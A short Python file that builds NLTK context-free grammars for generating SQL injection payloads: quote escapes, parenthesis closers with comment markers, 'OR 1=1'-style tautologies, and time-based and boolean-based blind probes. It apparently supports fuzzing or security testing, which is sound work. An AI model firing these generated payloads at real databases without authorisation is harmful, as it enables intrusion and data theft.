from nltk import CFG

# Define CFG for identifying valid escape characters
sql_grammar_phase1 = """
S -> ESC
ESC -> "'" | '"'
"""

# Define CFG for identifying valid parentheses structure
sql_grammar_phase2 = """
S -> ESC_COMMENT | CLOSE_PAREN COMMENT
ESC_COMMENT -> COMMENT
CLOSE_PAREN -> ")" | "))" | ")))" | "))))" | ")))))"
COMMENT -> "-- " | "# " | "/* "
"""

# Define CFG for inband SQL injection
# Modify sql_grammar_phase3 to distribute parentheses more flexibly
sql_grammar_phase3 = """
S -> CLAUSE
CLAUSE -> SIMPLE_CLAUSE | SIMPLE_CLAUSE OPERATION
SIMPLE_CLAUSE -> "OR 1=1" | "AND 1=1" | "OR 'a'='a'" | "AND 'a'='a'"
OPERATION -> "LIMIT 1 OFFSET" NUMBER | "ORDER BY" COLUMN
NUMBER -> "0" | "1" | "2" | "3" | "4" | "5" | "6" | "7" | "8" | "9"
COLUMN -> "1" | "2" | "3" | "4" | "5"
"""


# Define CFG for time-based blind SQL injection
sql_grammar_time = """
S -> " IF (1=1) THEN SLEEP(5) -- " | " IF (1=0) THEN SLEEP(5) -- "
"""

# Define CFG for boolean-based blind SQL injection
sql_grammar_boolean = """
S -> " IF (1=1) THEN 1 ELSE 0 -- " | " IF (1=0) THEN 1 ELSE 0 -- "
"""

cfg_phase_boolean = CFG.fromstring(sql_grammar_boolean)
cfg_phase_time = CFG.fromstring(sql_grammar_time)

cfg_phase1 = CFG.fromstring(sql_grammar_phase1)
cfg_phase2 = CFG.fromstring(sql_grammar_phase2)
cfg_phase3 = CFG.fromstring(sql_grammar_phase3)
